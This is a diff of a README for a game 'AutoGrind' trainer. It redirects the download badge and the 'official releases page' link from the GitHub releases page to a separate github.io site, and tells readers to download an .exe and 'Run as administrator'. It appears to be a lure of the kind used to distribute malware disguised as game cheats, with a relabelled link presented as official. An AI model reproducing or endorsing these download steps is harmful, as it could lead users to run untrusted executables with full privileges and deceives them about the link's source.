@@ -1,7 +1,7 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your game progress with ease
 
 <p align="center">
-  <a href="https://github.com/Bgako5001/DBD-AutoGrind-Trainer-2026/releases">
+  <a href="https://bgako5001.github.io">
     <img src="https://img.shields.io/badge/Download-Latest_Release-blue.svg" alt="Download">
   </a>
 </p>
@@ -25,7 +25,7 @@ Before you start, check your computer for these items:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/Bgako5001/DBD-AutoGrind-Trainer-2026/releases) to download the latest setup file.
+1. Visit the [official releases page](https://bgako5001.github.io) to download the latest setup file.
 2. Select the file named `DBD-AutoGrind-Trainer-2026-v2026.exe`.
 3. Save the file to a folder on your desktop.
 4. Right-click the file and select "Run as administrator."
